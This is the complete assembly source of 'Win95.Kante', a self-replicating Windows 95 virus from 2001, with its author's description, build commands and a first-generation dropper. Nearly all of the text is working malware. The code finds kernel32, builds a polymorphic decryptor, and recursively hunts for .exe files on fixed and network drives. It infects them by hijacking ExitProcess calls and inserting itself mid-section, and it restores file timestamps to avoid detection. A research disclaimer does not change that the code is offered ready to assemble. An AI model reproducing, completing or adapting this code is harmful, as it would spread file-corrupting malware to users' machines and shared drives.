   ; comment ~
   ;
   ; NAME: Win95.Kante
   ; AUTHOR: Black Jack [independant Austrian Win32asm virus coder]
   ; CONTACT: Black_Jack_VX@hotmail.com | http://blackjackvx.cjb.net
   ; TYPE: Win95 semi-resident light-poly PE midfile infector with EPO
   ; SIZE: 2016 bytes (+decryptor size)
   ;
   ; DESCRIPTION:
   ; The virus usually gains control when an infected file quits (this is due to
   ; its EPO feature). First the light-poly decryptor decrypts the virus body into
   ; a writeable section of the host and gives control to it. The virus then fully
   ; takes control of the hosts task, and starts scanning recursively for infect-
   ; able files on all drives and in all directories in the background. Files are
   ; infected by adding the virus body to the virtual end of one section (that can
   ; be somewhere in the middle of the file), if it fits in between there and the
   ; virtual start of the next section, the rest of the file is shifted back. This
   ; means that the physical size of the infected section is equal to its virtual
   ; size after infection, and they go up to the virtual start of the next section.
   ; Besides that a writeable section is searched and its RVA saved; the poly
   ; decryptor will decrypt the virus over there at runtime, thats why it is not
   ; necessary to modify the flags of any section.
   ; Before the file modification the victims code section was scanned for a
   ; JMP [imm32] or a CALL [imm32] to the ExitProcess API, this jmp/call will now
   ; be replaced with a jmp/call to the virus body. The virus uses no explicit
   ; infection marker, thats why multiple infections are possible, but each
   ; call to the ExitProcess API can be infected only once (and most HLL generated
   ; programs contain only one ExitProcess call), and also each section can only
   ; be infected once (and many sections can't be infected at all), that's why
   ; infected files won't grow infinitely.
   ; The virus body is also slightly polymorphic. The combination of not changing
   ; the section flags, EPO, midfile-infection and polymorphism should make the
   ; virus very hard to detect, I hope.
   ;
   ; POLY:
   ; First I have coded a quite neat poly engine for this virus. Then, when I
   ; wanted to add it, I found out that it would make this virus too big (the size
   ; of the virus body is limited to about 2 or 3 KB because of the midfile
   ; infection technique used). So I coded a very simple (and small) pseudo-
   ; poly engine for this virus. All it does is exchange the registers used in a
   ; static decryptor and add some basic junk opcodes, so it is basically a joke.
   ; But still I hope it will make detection at least a little more difficult
   ; combined with the other anti-detection techniques used in this virus. And,
   ; btw, my real poly engine will be used in my next creation, of course.
   ;
   ; COMMENTS:
   ; I lost interest in working on this virus any further, that's why I release it
   ; in this kinda unfinished form. It's unoptimised, partially uncommented and
   ; not tested enough, which means that there could be some bugs left. The main
   ; bug is that it won't work in WinNT, although it should theoretically, but I
   ; don't know why it doesn't, and really don't want to waste more time searching
   ; that silly bug, sorry.
   ;
   ; ASSEMBLE WITH:
   ;                 tasm32 /mx /m kante.asm
   ;                 tlink32 /Tpe /aa kante.obj,,, import32.lib
   ;
   ;                 there's no need for PEWRSEC or a similar tool, because the
   ;                 virus code is stored in the data section.
   ;
   ; DISCLAIMER: I do *NOT* support the spreading of viruses in the wild.
   ;             Therefore, this source was only written for research and
   ;             education. Please do not spread it. The author can't be hold
   ;             responsible for what you decide to do with this source.
   ;
   ; ~
   ; ===========================================================================

   workspace               EQU 100000
   virus_size              EQU (virus_end - virus_start)
   size_mem_buffer         EQU ((size main_data) + virus_size)

   Extrn MessageBoxA:Proc

   .386p
   .model flat
   .data
   virus_start:
           call next                               ; get the delta offset
   delta:

   loop_head       dd ?
   mem_buffer      dd ?

                   db "Win95.Kante by Black Jack, Austria, 2001", 0

   ; Kante is a great band from Germany. I named this virus in their honour,
   ; because around the same time I finished this virus, I saw them live, and
   ; it was a really wounderful performance.

   next:
           pop ebp
           sub ebp, (delta-virus_start)


   ; This method to get the kernel32 base address with the last SEH frame was
   ; described in an article in Top Device online some time ago. Unfortunately,
   ; I don't remember who the original author was, anyways full credits go to him

           mov eax, fs:[0]                         ; EAX=first SEH frame

   search_last_SEH:
           mov ebx, [eax]                          ; EBX=next SEH frame
           inc ebx                                 ; EBX=-1 means we have reached
                                                   ; the last SEH frame
           JZ found_last_SEH
           dec ebx
           xchg ebx, eax                           ; EAX=next SEH frame
           JMP search_last_SEH

   found_last_SEH:
           mov eax, [eax+4]                        ; EAX=last SEH handler
                                                   ; (which is always in k32)

   search_MZ:
           cmp word ptr [eax], "ZM"                ; is there an MZ header ?
           JE found_MZ
   not_found_MZ:
           dec eax                                 ; scan downwards
           JMP search_MZ

   found_MZ:
           mov ebx, [eax+3Ch]                      ; EBX=new header RVA
           cmp ebx, 1024                           ; is it small enough ?
           JNB not_found_MZ                        ; if not, scan on
           add ebx, eax                            ; EBX=PE header offset
           cmp dword ptr [ebx], "EP"               ; is there a PE header ?
           JNE not_found_MZ                        ; if not, scan on

           mov ebx, [ebx+120]                      ; EBX=export table RVA
           add ebx, eax                            ; RVA->VA

           mov esi, [ebx+20h]                      ; ESI=AddressOfNames RVA
           add esi, eax                            ; RVA->VA

   search_GPA_loop:
           xchg eax, edi                           ; save EAX (kernel32 base)
           lodsd                                   ; EAX=a API name RVA
           xchg eax, edi
           add edi, eax                            ; RVA->VA

           pusha                                   ; save all registers
           lea esi, [ebp+n_GetProcAddress-virus_start]  ; ESI="GetProcAddress"
           push dword ptr l_GetProcAddress         ; ECX=length of API name
           pop ecx
           cld                                     ; clear direction flag
           rep cmpsb                               ; compare the API names
           popa                                    ; restore all registers
           JNE search_GPA_loop                     ; if not equal, search on


   found_gpa:
           sub esi, eax                            ; VA->RVA
           sub esi, [ebx+20h]                      ; subtract AddressOfNames

           shr esi, 1                              ; ESI=((ESI/4)*2)-2
           dec esi
           dec esi
           add esi, [ebx+24h]                      ; add AddressOfNameOrdinals

           movzx ecx, word ptr [eax+esi]           ; ECX=API ordinal

           lea ecx, [ecx*4+eax]                    ; ECX=ordinal*4+k32 base
           add ecx, [ebx+1Ch]                      ; add AddressOfFunctions
           mov ecx, [ecx]                          ; ECX=API RVA
           add ecx, eax                            ; RVA->VA

           push eax                                ; save kernel32 handle
           push ecx                                ; save GetProcAddress VA

           lea ebx, [ebp+n_GlobalAlloc-virus_start]; EBX="GlobalAlloc"
           push ebx                                ; push API name offset
           push eax                                ; kernel32 handle
           CALL ecx                                ; call GetProcAddress

           push size_mem_buffer                    ; size to allocate
           push 0                                  ; flags
           CALL eax                                ; call GlobalAlloc

           pop dword ptr [eax.GetProcAddress]      ; put GPA API in our buffer
           pop dword ptr [eax.kernel32]            ; put k32 base in our buffer

           mov [ebp+mem_buffer-virus_start], eax   ; save mem buffer offset

   ; ----- A BASIC POLY ENGINE -------------------------------------------------

           mov esi, ebp                            ; ESI=virus start
           lea edi, [eax.poly_virus_body]          ; EDI=poly destination buffer

           mov bl, -1                              ; BL holds the register that
                                                   ; will hold the imagebase in
                                                   ; the decryptor
           mov cl, -1                              ; CL holds the register that
                                                   ; will hold the decryption
                                                   ; loop counter
           mov dl, -1                              ; DL holds the register that
                                                   ; will be used to decrypt

           CALL get_register                       ; get a free register
           xchg eax, ebx                           ; save as imagebase register
           CALL get_register                       ; get a free register
           xchg eax, ecx                           ; save as counter register
           CALL get_register                       ; get a free register
           xchg eax, edx                           ; save as use regiser

           CALL add_junk                           ; add some junk instructions

           mov al, bl                              ; AL=base register
           or al, 0B8h                             ; mov reg32, imm32
           stosb                                   ; store instruction
           push edi                                ; save where to put imagebase
           stosd                                   ; place for imagebase

           CALL add_junk                           ; add some junk instructions

           mov al, cl                              ; AL=counter register
           or al, 0B8h                             ; mov reg32, imm32
           stosb                                   ; store instruction
           mov eax, virus_size                     ; EAX=loop counter init value
           stosd                                   ; store it

           CALL add_junk                           ; add some junk instructions

           mov [ebp+loop_head-virus_start], edi    ; store the loop head

           CALL add_junk                           ; add some junk instructions

           xor eax, eax                            ; EAX=0
           mov ah, dl                              ; AH=use register
           shl ah, 3
           or ah, bl                               ; imagebase register
           or ax, 808Bh                            ; mov reg32, [reg32+imm32]
           stosw                                   ; store instruction
           push edi                                ; save place of RVA (imm32)
           stosd                                   ; store it

           CALL add_junk                           ; add some junk instructions

           mov al, 81h                             ; store decrypt instruction:
           stosb                                   ; add reg32, imm32
           mov al, 0C0h
           or al, dl
           stosb
           CALL get_random                         ; get a random crypt key
           push eax                                ; save it
           stosd                                   ; and store it

           CALL add_junk                           ; add some junk instructions

           xor eax, eax
           mov ah, dl
           shl ah, 3
           or ah, bl
           or ax, 8089h                            ; mov [reg32+imm32], reg32
           stosw
           push edi
           stosd

           CALL add_junk                           ; add some junk instructions

           mov al, bl                              ; AL=imagebase register
           or al, 40h                              ; inc reg32
           stosb
           stosb
           stosb
           stosb

           CALL add_junk                           ; add some junk instructions

           mov al, 48h                             ; DEC reg32
           or al, cl                               ; decrement the counter reg
           stosb                                   ; store instruction

           mov al, 75h                             ; JNZ opcode
           stosb
           mov eax, [ebp+loop_head-virus_start]
           sub eax, edi
           dec eax
           stosb

           CALL add_junk                           ; add some junk instructions

           mov al, 0E9h                            ; jmp near
           stosb
           push edi
           stosd

   ; ----- END OF POLY ENGINE --------------------------------------------------

           mov eax, [ebp+mem_buffer-virus_start]   ; EAX=memory buffer

           mov ecx, edi
           lea edx, [eax.poly_virus_body]
           sub ecx, edx
           mov [eax.decryptor_size], ecx

           pop dword ptr [eax.jmp_displacement_ptr]
           pop dword ptr [eax.write_section_RVA_ptr]
           pop edx
           pop dword ptr [eax.virus_RVA_ptr]
           pop dword ptr [eax.imagebase_ptr]

           xchg ebp, eax                           ; EAX=old delta offset
                                                   ; EBP=memory buffer

           mov dword ptr [ebp.start_virusbody], eax ; save old delta offset

           push eax                                ; save old delta offset


           mov ecx, (virus_size/4)

   encrypt_loop:
           lodsd                                   ; get a dword of plaintext
           sub eax, edx                            ; encrypt it
           stosd                                   ; store encrypted dword
           LOOP encrypt_loop                       ; do the next dword

           mov ecx, edi                            ; ECX=end of poly virus body
           lea edx, [ebp.poly_virus_body]          ; EDX=start of poly virus body
           sub ecx, edx                            ; ECX=poly virus body length
           mov [ebp.poly_virus_size], ecx          ; store it


           pop eax                                 ; EAX=old delta offset

           lea esi, [eax+other_API_names-virus_start]
           lea edi, [ebp.SetFileAttributesA]       ; first regular API VA
           mov ecx, number_of_other_APIs           ; number of APIs to scan for

   Get_APIs_loop:
           push ecx                                ; save number of APIs left

           push esi                                ; get this API address
           push dword ptr [ebp.kernel32]
           call dword ptr [ebp.GetProcAddress]

           stosd                                   ; store API address

   search_next_API_name:                           ; search end of API name
           lodsb
           or al, al
           JNE search_next_API_name

           pop ecx                                 ; restore number of APIs left
           LOOP Get_APIs_loop


   ; ----- START SCANNING ALL DRIVES -------------------------------------------

           mov [ebp.drive], "\:C"                  ; start with C:\ drive

   scan_all_drives_loop:
           lea eax, [ebp.drive]                    ; EAX=ptr to drive name
           push eax                                ; push it for SetCurDirA

           push eax                                ; get type of this drive
           CALL [ebp.GetDriveTypeA]
           cmp eax, 3                              ; fixed drive ?
           JE scan_drive                           ; if yes, infect it
           cmp eax, 4                              ; remote/network drive?
           JE scan_drive                           ; if yes, infect it

                                                   ; we can't infect this drive
           pop eax                                 ; remove shit from stack
           JMP scan_next_drive                     ; try next drive

   scan_drive:
           CALL dword ptr [ebp.SetCurrentDirectoryA] ; go to root dir of this drv
           CALL rec_search                         ; and start scanning there

   scan_next_drive:
           inc byte ptr [ebp.drive]                ; try next drive
           cmp byte ptr [ebp.drive], "Z"           ; done all drives ?
           JNE scan_all_drives_loop                ; if not, scan on


           JMP dword ptr [ebp.ExitProcess]         ; quit task if all is done


   ; ----- INFECT CURRENT DIRECTORY --------------------------------------------

   rec_search:
           lea eax, [ebp.FileAttributes]           ; EAX=ptr to FindFileStructure
           push eax                                ; push it
           CALL filemask_next                      ; push pointer to "*.*", 0
   db "*.*", 0
   filemask_next:
           call [ebp+FindFirstFileA]               ; find the first file

           inc eax                                 ; -1 means error
           JZ error_exit
           dec eax                                 ; restore search handle

           push eax                                ; save search handle


   search_loop:
           lea edi, [ebp.FileName]                 ; EDI=pointer to filename

           test dword ptr [ebp.FileAttributes], 10h ; is this file a directory ?
           JNZ directory

           push 5                                  ; sleep a while
           call [ebp.Sleep]

           xor eax, eax                            ; search for end of filename
           mov cl, 0FFh
           cld
           repne scasb

           mov eax, [edi-4]                        ; EAX=filename extension
           or eax, 202020h                         ; make lowercase
           cmp eax, "exe"                          ; is it a .EXE file ?
           JNE search_on

           call infect_file                        ; if yes, try to infect it

           JMP search_on                           ; if not, search next file

   directory:
           cmp byte ptr [edi], "."                 ; is it the "." or ".." dir ?
           JE search_on                            ; if yes, forget it
           push edi                                ; if not, change dir to there
           call [ebp.SetCurrentDirectoryA]

           call rec_search                         ; and search the files in
                                                   ; there recursively

           push dword ptr ".."                     ; go back down in the tree
           push esp
           call [ebp.SetCurrentDirectoryA]
           pop eax                                 ; remove the ".." from stack

   search_on:
           pop edx                                 ; EDX=search handle
           push edx                                ; save it back to stack

           lea eax, [ebp.FileAttributes]           ; EAX=ptr to FindFileStructure
           push eax
           push edx
           call [ebp.FindNextFileA]                ; find next file
           or eax, eax                             ; zero means error
           JNZ search_loop                         ; if no error, search on

           call [ebp.FindClose]                    ; close the filesearch
   error_exit:
           RET


           db "Du bist schon *berall gewesen", 0
           db "Du hast die Berge und das Meer gesehen", 0
           db "Die Menschen, Tiere und Maschinen", 0
           db "Und du redest mit ihnen", 0
           db "Es gibt unz„hlige Geschichten, die *ber dich im Umlauf sind", 0
           db "An jedem Ort von dir berichten, so wie Bl„tter im Wind", 0

   ; These are lyrics from the wounderful song "Live at the electric Avenue" by
   ; Kante. Its a song about a person (or a allegoric figure) that moves around
   ; the world, never staying for long in one place, leaving lots of rumours
   ; about him behind, existing more like a shadow or a ghost.
   ; Here the English translation:
   ;
   ; "You have already been everywhere
   ;  You know the mountains and the see
   ;  The people, animals and machines
   ;  And you talk with them
   ;  There is an uncountable number of stories that are around about you
   ;  and tell about you in every place, just like leaves in the wind"

   ; ----- INFECT A FILE -------------------------------------------------------

   infect_file:
           push 80h                                ; normal attributes
           lea eax, [ebp.FileName]
           push eax                                ; offset filename
           call [ebp.SetFileAttributesA]
           or eax, eax
           JZ quit_infect_error

           push 0                                  ; template file (shit)
           push 80h                                ; file attributes (normal)
           push 3                                  ; open existing
           push 0                                  ; security attributes (shit)
           push 0                                  ; do not share file
           push 0C0000000h                         ; read/write mode
           lea eax, [ebp.FileName]
           push eax                                ; offset filename
           call [ebp.CreateFileA]
           mov [ebp.filehandle], eax
           inc eax
           JZ restore_attributes

           mov eax, [ebp.FileSizeLow]
           add eax, workspace

           push 0                                  ; name file mapping obj (shit)
           push eax                                ; low dword of filesize
           push 0                                  ; high dword of filesize
           push 4                                  ; PAGE_READWRITE
           push 0                                  ; security attributes (shit)
           push dword ptr [ebp.filehandle]
           call [ebp.CreateFileMappingA]
           mov [ebp.maphandle], eax
           or eax, eax
           JZ close_file_error

           push 0                                  ; map the whole file
           push 0                                  ; low dword of fileoffset
           push 0                                  ; high dword of fileoffset
           push 2                                  ; read/write access
           push eax                                ; maphandle
           call [ebp.MapViewOfFile]
           mov [ebp.mapbase], eax
           or eax, eax
           JZ closefilemapping

           cmp word ptr [eax], "ZM"
           JNE abort_infection

           mov ebx, eax
           add ebx, dword ptr [eax+3Ch]

           cmp dword ptr [ebx], "EP"
           JNE abort_infection

           mov ecx, [ebx+34h]                      ; ImageBase
           mov edx, [ebp.imagebase_ptr]
           mov [edx], ecx                          ; store it in poly decryptor

           mov edx, ebx
           add edx, 18h                            ; fileheader size
           movzx ecx, word ptr [ebx+14h]           ; optional header size
           add edx, ecx
           movzx ecx, word ptr [ebx+6]             ; Number of sections

           pusha

           mov esi, dword ptr [ebx+80h]            ; import table RVA
           call get_section

   find_kernel32_import_descriptor:
           mov eax, [esi+0Ch]                      ; dll name RVA
           or eax, eax                             ; already last import descr?
           JZ failure_exit_with_one_popa
           add eax, edi
           mov ecx, [eax]
           or ecx, 20202020h                       ; lowercase
           cmp ecx, "nrek"
           JNE search_next_import_descriptor
           mov ecx, [eax+4]
           or cx, 2020h
           cmp ecx, "23le"
           JE found_kernel32_import_descriptor

   search_next_import_descriptor:
           add esi, 14h
           JMP find_kernel32_import_descriptor

   found_kernel32_import_descriptor:
           mov eax, [esi]                          ; API names ptr array ptr
           or eax, eax
           JNZ kernel32_imports_ok
           mov eax, [esi+16]
   kernel32_imports_ok:
           add eax, edi
           xor ecx, ecx

   search_ExitProcess:
           pusha
           mov esi, [eax+ecx*4]
           or esi, esi
           JZ search_ExitProcess_failed
           inc esi
           inc esi
           add esi, edi

           mov edi, [ebp.start_virusbody]
           add edi, (n_ExitProcess - virus_start)
           mov ecx, l_ExitProcess
           cld
           rep cmpsb
           popa
           JE found_ExitProcess
           inc ecx
           JMP search_ExitProcess

   search_ExitProcess_failed:
           popa
   failure_exit_with_one_popa:
           popa
           JMP abort_infection

   found_ExitProcess:
           mov eax, [esi+10h]                      ; API RVAs array ptr
           lea eax, [eax+ecx*4]
           add eax, [ebx+34h]                      ; ImageBase

           mov [ebp.EPO_API_VA], eax

           popa
           pusha

           mov esi, dword ptr [ebx+28h]            ; ESI=EntryRVA
           call get_section
           mov esi, dword ptr [edx+14h]            ; PointerToRawData
           add esi, eax
           mov ecx, [edx+10h]                      ; SizeOfRawData
           sub ecx, 5

           mov ebx, [ebp.EPO_API_VA]

   search_JMP_CALL_ExitProcess:
           cmp byte ptr [esi], 0FFh                ; search for a possible API
                                                   ; call opcode
           JNE searchon_JMP_CALL_ExitProcess
           cmp dword ptr [esi+2], ebx
           JNE searchon_JMP_CALL_ExitProcess
           cmp byte ptr [esi+1], 15h               ; is there a CALL [imm32] ?
           JE found_CALL_ExitProcess
           cmp byte ptr [esi+1], 25h               ; is there a JMP [imm32] ?
           JE found_JMP_ExitProcess
   searchon_JMP_CALL_ExitProcess:
           inc esi
           LOOP search_JMP_CALL_ExitProcess

   search_JMP_CALL_ExitProcess_failed:
           popa
           JMP abort_infection

   found_JMP_ExitProcess:
           mov byte ptr [ebp.epo_opcode], 0E9h     ; jmp near
           JMP save_epo_address

   found_CALL_ExitProcess:
           mov byte ptr [ebp.epo_opcode], 0E8h     ; call near

   save_epo_address:
           mov [ebp.epo_offset], esi

           sub esi, eax                            ; EAX=mapbase
           sub esi, [edx+14h]                      ; PointerToRawData
           add esi, [edx+0Ch]                      ; VirtualAddress
           mov [ebp.epo_RVA], esi

           popa

           pusha

           mov esi, [ebp.write_section_RVA_ptr]
           mov dword ptr [esi], 0

   search_writeable_section_loop:
           test dword ptr [edx+24h], 080000000h    ; is section writeable?
           JZ not_writeable
           cmp dword ptr [edx+8], virus_size       ; VirtualSize of sect. n
           JB not_writeable                        ; section not big enough
           mov edi, dword ptr [edx+0Ch]            ; VirtualAddress of sect. n
           mov [esi], edi                          ; save it
   not_writeable:
           add edx, 28h                            ; next section header
           LOOP search_writeable_section_loop

           cmp dword ptr [esi], 0
           popa
           JE abort_infection

           dec ecx

   search_section_loop:
           mov edi, dword ptr [edx+28h+0Ch]        ; VirtualAddress of sect. n+1
           sub edi, dword ptr [edx+0Ch]            ; VirtualAddress of sect. n
           push edi
           mov esi, dword ptr [edx+8]              ; VirtualSize of sect. n
           or esi, esi
           JNZ VirtualSize_OK
           mov esi, dword ptr [edx+10h]            ; SizeOfRawData of sect. n
   VirtualSize_OK:
           sub edi, esi
           cmp edi, [ebp.poly_virus_size]
           pop edi
           JAE found_section
   next_section:
           add edx, 28h                            ; next section header
           LOOP search_section_loop

           JMP abort_infection

   found_section:
           add esi, dword ptr [edx+0Ch]            ; add VirtualAddr. of sect. n
           mov [ebp.virus_RVA], esi                ; store virus-RVA

           mov esi, dword ptr [edx+14h]            ; ESI=PointerToRawData sect n
           or esi, esi                             ; is it a BSS section ?
           JNZ not_BSS
           mov esi, dword ptr [edx-28h+14h]        ; PointerToRawData of sect n-1
           or esi, esi                             ; another BSS section ?!
           JZ abort_infection                      ; if yes, better not infect
           add esi, dword ptr [edx-28h+10h]        ; SizeOfRawData of sect. n-1
           mov dword ptr [edx+14h], esi            ; Set new PointerToRawData
   not_BSS:
           push esi
           add esi, dword ptr [edx+8]              ; old VirtualSize of sect. n
           add esi, eax
           mov [ebp.virus_offset], esi             ; store virus-file-offset
           pop esi
           add esi, dword ptr [edx+10h]            ; old Raw size of sect. n

           mov dword ptr [edx+8], edi              ; set new VirtualSize
           sub edi, dword ptr [edx+10h]            ; SizeOfRawData
                                                   ; EDI=filesize increase

           push dword ptr [edx+8]                  ; VirtualSize
           pop dword ptr [edx+10h]                 ; SizeOfRawData

           pusha


           mov esi, [ebp.FileSizeLow]              ; ESI=old filesize
           add edi, esi                            ; EDI=new filesize
           mov [ebp.FileSizeLow], edi

   find_non_BSS_section:
           add edx, 28h
           mov ecx, dword ptr [edx+14h]            ; PointerToRawData sect n+1
           JCXZ find_non_BSS_section

           neg ecx
           add ecx, esi

           add esi, eax
           add edi, eax
           dec esi
           dec edi
           std
           rep movsb

           popa

   correct_section_headers_loop:
           add edx, 28h                            ; next section header
           cmp dword ptr [edx+14h], 0
           JE dont_correct_section_header
           add dword ptr [edx+14h], edi            ; correct PointerToRawData
   dont_correct_section_header:
           LOOP correct_section_headers_loop

           mov ecx, edi                            ; ECX=filesize increase
           mov edi, esi
           add edi, eax
           xor eax, eax
           cld
           rep stosb


           mov edi, [ebp.epo_offset]               ; where to place jmp to virus
           mov al, [ebp.epo_opcode]                ; how to give control to virus
           stosb                                   ; store the opcode
           mov eax, [ebp.virus_RVA]                ; EAX=RVA of virus
           push eax                                ; save it
           sub eax, [ebp.epo_RVA]                  ; calculate jmp displacement
           sub eax, 5                              ; length of jmp/call near
           stosd                                   ; store it

           mov eax, [ebp.write_section_RVA_ptr]    ; ptr to RVA of writeable sect
           mov eax, [eax]                          ; EAX=RVA of writeable section
           pop ecx                                 ; ECX=RVA of virus
           mov edx, [ebp.virus_RVA_ptr]            ; ptr to virusRVA in decryptor
           add ecx, [ebp.decryptor_size]           ; ECX=start of encrypted virus
           mov [edx], ecx                          ; new virusRVA to decryptor

           mov edx, [ebp.jmp_displacement_ptr]     ; EDX=ptr to jmp to decrypted
                                                   ; virus in decryptor
           sub eax, ecx                            ; calculate jmp displacement
           mov [edx], eax                          ; set the new one


           lea esi, [ebp.poly_virus_body]          ; ESI=poly virus body
           mov edi, [ebp.virus_offset]             ; EDI=virus location in map
           mov ecx, [ebp.poly_virus_size]          ; ECX=size of poly virus body
           rep movsb                               ; copy poly virus body to file



   already_infected:
   abort_infection:
           push dword ptr [ebp.mapbase]            ; unmap file
           call [ebp.UnmapViewOfFile]

   closefilemapping:
           push dword ptr [ebp.maphandle]          ; close mapping object
           call [ebp.CloseHandle]

           push 0                                  ; relative to start of file
           push 0                                  ; high dword ptr to file offs
           push dword ptr [ebp.FileSizeLow]
           push dword ptr [ebp.filehandle]
           call [ebp.SetFilePointer]               ; set filepointer to new EOF

           push dword ptr [ebp.filehandle]         ; truncate file at end
           call [ebp.SetEndOfFile]

           lea eax, [ebp.LastWriteTime]            ; restore old filetimes
           push eax
           sub eax, 8
           push eax
           sub eax, 8
           push eax
           push dword ptr [ebp.filehandle]
           call [ebp.SetFileTime]

   close_file_error:
           push dword ptr [ebp.filehandle]         ; close file
           call [ebp.CloseHandle]

   restore_attributes:
           push dword ptr [ebp.FileAttributes]     ; restore old file attributes
           lea eax, [ebp.FileName]
           push eax                                ; offset filename
           call [ebp.SetFileAttributesA]

   quit_infect_error:
           RET


   ; ----- CONVERT RVA TO PHYSICAL OFFSET --------------------------------------

   get_section:
           mov edi, dword ptr [edx+0Ch]            ; EDI=VirtualAddress
           cmp edi, esi
           JA try_next_section
           add edi, dword ptr [edx+8]              ; VirtualSize
           cmp edi, esi
           JA found_our_section

   try_next_section:
           add edx, 28h                            ; go to next section header
           JMP get_section

   found_our_section:
           mov edi, dword ptr [edx+14h]            ; PointerToRawData
           sub edi, dword ptr [edx+0Ch]            ; VirtualAddress
           add edi, eax                            ; EDI=difference RVA/offset in
                                                   ; memmap for this section
           add esi, edi                            ; ESI=offset in memmap that
                                                   ; corresponds to the given RVA

           RET


   ; ----- POLY ENGINE SUBROUTINES ---------------------------------------------

   _AX = 0
   _CX = 1
   _DX = 2
   _BX = 3
   _SP = 4
   _BP = 5
   _SI = 6
   _DI = 7


   add_junk:
           push eax                                ; save registers
           push ebx
           push ecx
           push edx
           push esi
           push ebp

           CALL get_random                         ; get a random number
           and eax, 11b                            ; random number from 0 to 3
           inc eax                                 ; random number from 1 to 4
           cmp al, 4
           JNE counter_ok
           dec eax                                 ; random number from 1 to 3
   counter_ok:
           xchg eax, esi                           ; ESI=counter for junk-opcodes

   add_junk_loop:
           mov al, 81h                             ; first byte of opcode
           stosb

           CALL get_random                         ; get a random number between
           and al, 7                               ; 0C0h and 0F8h, all those
           shl al, 3                               ; opcodes are arithmetic
           add al, 0C0h                            ; instructions of the form
           xchg eax, ebp                           ; op reg32, imm32

           CALL get_register                       ; get a garbage register
           or eax, ebp

           stosb                                   ; store the 2nd byte of opcode

           CALL get_random                         ; random imm32
           stosd                                   ; store

           dec esi                                 ; decrease counter
           JNZ add_junk_loop                       ; repeat loop if counter != 0

           pop ebp                                 ; restore registers
           pop esi
           pop edx
           pop ecx
           pop ebx
           pop eax
           RET


   get_register:
           CALL get_random                         ; get a random number
           and al, 111b                            ; between 0 and 7
           cmp al, bl                              ; avoid already used registers
           JE get_register
           cmp al, cl
           JE get_register
           cmp al, dl
           JE get_register
           cmp al, _SP                             ; avoid ESP (stack must not
           JE get_register                         ; me destroyed by decryptor)
           cmp al, _BP                             ; avoid EBP (some opcodes look
           JE get_register                         ; different for EBP)
           cmp al, _AX                             ; avoid EAX (because of the
           JE get_register                         ; optimised opcodes for EAX)
           RET

   get_random:
           in eax, 40h                             ; I know, I know, this is a
           RET                                     ; privileged op-code in WinNT.
                                                   ; But since the virus doesn't
                                                   ; work there anyways, I use
                                                   ; it because of convenience.
                                                   ; so please note that this is
                                                   ; not the main reason for
                                                   ; WinNT incompatibility!



   n_GetProcAddress        db "GetProcAddress", 0
   l_GetProcAddress        EQU ($ - n_GetProcAddress)

   n_GlobalAlloc           db "GlobalAlloc", 0


   other_API_names:
   n_SetFileAttributesA    db "SetFileAttributesA", 0
   n_CreateFileA           db "CreateFileA", 0
   n_GetFileTime           db "GetFileTime", 0
   n_SetFileTime           db "SetFileTime", 0
   n_GetFileSize           db "GetFileSize", 0
   n_CreateFileMappingA    db "CreateFileMappingA", 0
   n_MapViewOfFile         db "MapViewOfFile", 0
   n_UnmapViewOfFile       db "UnmapViewOfFile", 0
   n_SetFilePointer        db "SetFilePointer", 0
   n_SetEndOfFile          db "SetEndOfFile", 0
   n_CloseHandle           db "CloseHandle", 0
   n_GetDriveTypeA         db "GetDriveTypeA", 0
   n_SetCurrentDirectoryA  db "SetCurrentDirectoryA", 0
   n_FindFirstFileA        db "FindFirstFileA", 0
   n_FindNextFileA         db "FindNextFileA", 0
   n_FindClose             db "FindClose", 0
   n_Sleep                 db "Sleep", 0
   n_ExitProcess           db "ExitProcess", 0
   l_ExitProcess           EQU ($ - n_ExitProcess)

   number_of_other_APIs    EQU 18


   if ((($-virus_start) mod 4) NE 0)               ; align 4
           db (4-(($-virus_start) mod 4)) dup(0)
   endif

   virus_end:


   main_data       struc
   SetFileAttributesA      dd ?
   CreateFileA             dd ?
   GetFileTime             dd ?
   SetFileTime             dd ?
   GetFileSize             dd ?
   CreateFileMappingA      dd ?
   MapViewOfFile           dd ?
   UnmapViewOfFile         dd ?
   SetFilePointer          dd ?
   SetEndOfFile            dd ?
   CloseHandle             dd ?
   GetDriveTypeA           dd ?
   SetCurrentDirectoryA    dd ?
   FindFirstFileA          dd ?
   FindNextFileA           dd ?
   FindClose               dd ?
   Sleep                   dd ?
   ExitProcess             dd ?


   kernel32        dd ?
   GetProcAddress  dd ?

   drive           dd ?

   start_virusbody dd ?

   poly_virus_size dd ?
   decryptor_size  dd ?

   filehandle      dd ?
   maphandle       dd ?
   mapbase         dd ?


   virus_offset    dd ?
   virus_RVA       dd ?

   EPO_API_VA      dd ?

   epo_offset      dd ?
   epo_RVA         dd ?

   epo_opcode      db ?


   jmp_displacement_ptr    dd ?
   write_section_RVA_ptr   dd ?
   virus_RVA_ptr           dd ?
   imagebase_ptr           dd ?


   FileAttributes  dd ?                            ; FindData structure
   CreationTime    dq ?
   LastAccessTime  dq ?
   LastWriteTime   dq ?
   FileSizeHigh    dd ?
   FileSizeLow     dd ?
   wfd_reserved    dq ?
   FileName        db 260 dup(?)
   DosFileName     db 14 dup(?)


   poly_virus_body db ?

   main_data       ends


   .code
   first_gen_host:
           push 0
           push offset first_gen_capt
           push offset first_gen_msg
           push 0
           call MessageBoxA

           push 0
           call virus_start

   first_gen_capt  db "Win95.Kante by Black Jack", 0
   first_gen_msg   db "This is a first generation virus dropper", 0

   end first_gen_host
